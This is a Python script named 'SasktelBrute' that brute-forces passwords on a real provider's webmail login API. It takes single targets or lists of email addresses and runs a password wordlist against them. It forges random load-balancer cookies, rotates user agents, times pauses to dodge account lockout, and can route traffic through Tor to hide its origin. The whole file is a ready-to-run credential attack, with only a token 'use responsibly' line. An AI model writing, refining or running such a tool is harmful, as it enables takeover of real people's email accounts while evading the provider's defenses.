import requests
import argparse
import time
import random
import string
from colorama import Fore, init
import socks
import socket

init(autoreset=True)

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'
]


def current_timestamp():
    return f"{Fore.WHITE}[{Fore.YELLOW}{time.strftime('%H:%M:%S', time.localtime())}{Fore.WHITE}]{Fore.RESET}"


def set_up_tor():
    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} INITIALIZING TOR PROXY...")
    old_ip = get_public_ip()
    socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
    socket.socket = socks.socksocket
    new_ip = get_public_ip()
    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Old IP: {Fore.LIGHTBLUE_EX}{old_ip}")  
    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} New IP (via Tor): {Fore.LIGHTBLUE_EX}{new_ip}")
    time.sleep(1.5)

def get_public_ip():
    """Get the public IP address."""
    try:
        response = requests.get('https://api.ipify.org')
        return response.text
    except requests.RequestException:
        return "Unknown IP"


def load_usernames_from_file(filename):
    with open(filename, encoding='latin-1') as file:
        return file.read().splitlines()


def parse_arguments():
    parser = argparse.ArgumentParser(
        prog='SasktelBrute',
        description='Bruteforce Sasktel Webmail. Include lockout prevention.',
        epilog='Use responsibly and ethically.')

    parser.add_argument('-w', '--wordlist', required=True, help="Password Wordlist")
    parser.add_argument('-u', '--user', type=str, help="Full username including @sasktel.net")
    parser.add_argument('-U', '--userfile', type=str, help="File containing a list of email addresses of targets")
    parser.add_argument('--tor', action='store_true', help="Use Tor for anonymization")
    args = parser.parse_args()
    if args.user and args.userfile:
        parser.error(
            "Specify either a single user with -u/--user or a file containing a list of users with -U/--userfile, not both.")

    users = [args.user] if args.user else load_usernames_from_file(args.userfile)
    with open(args.wordlist, encoding='latin-1') as file:
        passwords = file.read().splitlines()

    return users, passwords, args.tor


def generate_random_cookie_part(length=48):
    characters = string.ascii_letters + string.digits + string.punctuation
    cookie_part = ''.join(random.choice(characters) for i in range(length))
    return cookie_part


def attack(user, password, user_agent):
    url = 'https://webmail.sasktel.net/api/bf/login/'
    random_part = generate_random_cookie_part()
    cookie_value = f"BIGipServer~C7~C7_PMAIL.0_IPv4_80_POOL=!YR/{random_part},"
    headers = {
        'Host': 'webmail.sasktel.net',
        'User-Agent': user_agent,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-CA,en-US;q=0.7,en;q=0.3;',
        'Accept-Encoding': 'gzip, deflate, br',
        'Referer': 'https://webmail.sasktel.net/',
        'Content-Type': 'application/json',
        'Cookie': cookie_value,
        'ADRUM': 'isAjax:true',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin'
    }

    print(f"{Fore.YELLOW}USER-AGENT:{Fore.RESET} {user_agent}")
    print(f"{Fore.YELLOW}COOKIE:{Fore.RESET} {cookie_value}")

    data = {
        "SnapInfo": {
            "SnapEmailField": None,
            "SnapPassField": None,
            "SnapUrl": None,
            "SnapOn": "NO",
            "SnapShortEmailOn": None,
            "SnapRemoteAuth": "YES"
        },
        "user": user,
        "password": password
    }

    try:
        response = requests.post(url, json=data, headers=headers, timeout=10)
        if response.status_code == 400:
            print(f"{Fore.YELLOW}RESPONSE:{Fore.RESET}{Fore.RED} {response.text}")
        elif response.status_code == 200:
            print(f"{Fore.YELLOW}RESPONSE:{Fore.RESET}{Fore.GREEN} {response.text}")

            print(f"{current_timestamp()} PASSWORD FOUND: {Fore.LIGHTBLUE_EX}{password}")
            return True
    except requests.RequestException as e:
        print(f"{current_timestamp()}Error during request: {e}")
        return False

    return False


def get_last_password_index():
    try:
        with open("last_password_index.txt", "r") as f:
            return int(f.read().strip())
    except:
        return 0


def set_last_password_index(index):
    with open("last_password_index.txt", "w") as f:
        f.write(str(index))


if __name__ == '__main__':
    users, passwords, use_tor = parse_arguments()

    if use_tor:
        set_up_tor()

    print("Starting the attack...")

    user_agent_index = 0
    password_limit = 10
    attempt_count = 0
    use_pause = len(users) == 1  # Add a condition to check the number of users

    current_password_index = 0

    while current_password_index < len(passwords):
        for user in users:

            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}Attacking user:{Fore.LIGHTBLUE_EX} {user}")
            attempted_passwords = 0

            for i in range(current_password_index, current_password_index + password_limit):
                if i >= len(passwords):
                    break

                password = passwords[i]
                print(f"\n{current_timestamp()} Attempt #{attempt_count} - Trying password:{Fore.YELLOW} {password}")

                current_user_agent = USER_AGENTS[user_agent_index]
                user_agent_index = (user_agent_index + 1) % len(USER_AGENTS)

                if attack(user, password, current_user_agent):
                    break

                time.sleep(2)
                attempted_passwords += 1
                attempt_count += 1

                if attempt_count % 49 == 0:

                    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}Waiting for 15 minutes...")
                    time.sleep(15 * 60)

                elif attempt_count % 10 == 0 and use_pause:  # Modify this line

                    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}Waiting for 30 seconds...")
                    time.sleep(30)

        current_password_index += password_limit

    print("Attack finished.")
